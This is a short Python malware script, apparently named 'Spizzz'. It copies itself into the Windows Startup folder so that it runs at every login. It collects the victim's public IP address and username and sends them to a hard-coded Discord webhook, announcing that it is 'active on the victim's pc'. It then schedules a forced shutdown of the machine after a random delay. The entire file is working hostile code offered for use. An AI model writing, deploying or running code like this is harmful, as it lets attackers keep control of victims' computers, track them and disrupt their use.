import os
from os.path import isfile
from os import getenv, startfile
import random
import requests
from shutil import copy
from urllib.request import Request, urlopen
from json import loads

path = "%s/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/spizzz.pyw" % getenv("userprofile")

if not isfile(path):
    copy(__file__, path)
    startfile(path)
    exit()
elif __file__.replace('\\', '/') != path.replace('\\', '/'):
    exit()

class spizzz :

    ticks = random.randint(300,1800)
    ip = loads(urlopen(Request('http://ipinfo.io/json')).read())['ip']
    computer_username = getenv("username")

    url = "https://discord.com/api/webhooks/938335348038189056/US8my9PBYkN0TrsN99jazFGgbqfb4G5I4dOrYS1SPrKOAjR15T2fMoUJvN4rvaQvr_Gu"

    embed = {
        "title": "Spizzz is now active on the victim's pc :",
        "color": 0x53C33C,
        "fields": [
            {
                "name": "**ShutDown :**",
                        "value": f"__Extinction dans :__{ticks} secondes",
                        "inline": True
            },
            {
                "name": "**Infos Supplémentaires :**",
                        "value": f"__IP:__ {ip}\n__Utilisateur PC:__ {computer_username}",
                        "inline": True
            }
        ],
        "footer" : {"text" : "Spizz by LikAnda"},
        }

    data = {
        "content": "",
        "username": "",
        "embeds": [
            embed
            ],
    }

    result = requests.post(url, json = data)
    try:
        result.raise_for_status()
    except requests.exceptions.HTTPError as err:
        print(err)
    else:
        print("Payload delivered successfully, code {}.".format(result.status_code))

    os.system(f"shutdown /s /t {ticks}")